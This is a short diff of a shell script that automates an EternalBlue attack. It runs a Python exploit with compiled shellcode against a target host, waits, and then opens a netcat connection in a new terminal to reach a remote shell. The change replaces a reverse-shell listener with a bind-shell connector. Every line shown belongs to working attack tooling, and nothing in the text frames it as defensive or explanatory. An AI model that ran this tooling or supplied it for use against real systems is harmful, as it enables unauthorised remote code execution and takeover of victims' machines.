@@ -43,8 +43,9 @@ echo "Calling: /bin/bash $(pwd)/shellcode/shell_prep.sh"
 if test -f "./sc_all.bin"; then
 	echo "Calling: /usr/bin/python2.7 $(pwd)/eternalblue_exploit$win.py"
 	/usr/bin/python2.7 ../eternalblue_exploit$win.py $1 ./sc_all.bin
-	sleep 2
-	echo "Spwaning nc-listener in new gnome-terminal..."
+	echo "Waiting a few seconds for the shellcode to come alive"
+	sleep 10
+	echo "Spwaning nc-connector in new gnome-terminal..."
 	# This will only work under gnome/unity GUI-environments
 	gnome-terminal -q -- /usr/bin/nc -v $1 $2
 	echo "Done."
@@ -53,7 +54,7 @@ else
 	exit 4
 fi
 
-echo "All done. If you are lucky, you should have a reverse-shell by now."
+echo "All done. If you are lucky, you should have a bind-shell by now."
 echo "If not. Try rerunning the script as the exploit might not always run successfully."
 echo ""
 echo "Don't be evil."
